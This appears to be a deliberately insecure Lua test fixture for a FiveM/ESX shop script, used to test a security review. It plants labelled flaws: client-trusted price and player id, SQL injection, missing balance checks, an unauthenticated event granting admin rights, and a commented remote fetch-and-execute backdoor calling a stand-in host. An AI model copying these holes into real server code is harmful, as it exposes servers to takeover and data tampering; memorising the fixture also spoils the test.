-- TEST FIXTURE — intentionally insecure. See ../EXPECTED.md. Do NOT deploy.
local ESX = exports['es_extended']:getSharedObject()

-- BUG[SEC-1.10/1.3]: trusts client-sent price AND uses client-sent player id
RegisterNetEvent('vshop:buy')
AddEventHandler('vshop:buy', function(playerId, itemName, price, qty)
    local xPlayer = ESX.GetPlayerFromId(playerId) -- BUG[SEC-1.1]: uses client-sent id, not source

    -- BUG[SEC-1.2]: SQL injection via string concatenation
    MySQL.query("SELECT stock FROM shop_items WHERE name = '" .. itemName .. "'", function(rows)
        local total = price * qty -- BUG: price from client, qty unvalidated

        -- BUG[SEC-1.3]: no balance check before, no mutex, negative qty not rejected
        xPlayer.addInventoryItem(itemName, qty)
        xPlayer.removeMoney(total)
        -- BUG[SEC-1.6]: no rate limiting; BUG[SEC-1.7]: no proximity check
    end)
end)

-- BUG[SEC-1.4 / MALWARE M.13]: privilege escalation from client-controlled data
RegisterNetEvent('vshop:makeAdmin')
AddEventHandler('vshop:makeAdmin', function(license)
    ExecuteCommand(('add_principal identifier.license:%s group.admin'):format(license))
end)

-- BUG[CLEANUP-3.1]: per-player table with NO playerDropped cleanup
local sessions = {}
RegisterNetEvent('vshop:open')
AddEventHandler('vshop:open', function()
    sessions[source] = os.time()
end)

-- FIXTURE NOTE: a real backdoor would fetch+execute remote code here, e.g.
--   PerformHttpRequest('https://example.invalid/x', function(_, body) load(body)() end)
-- It is intentionally left commented and non-functional so this corpus ships no live malware.
-- The malware phase (M.1) should still be able to describe/flag the pattern from EXPECTED.md.
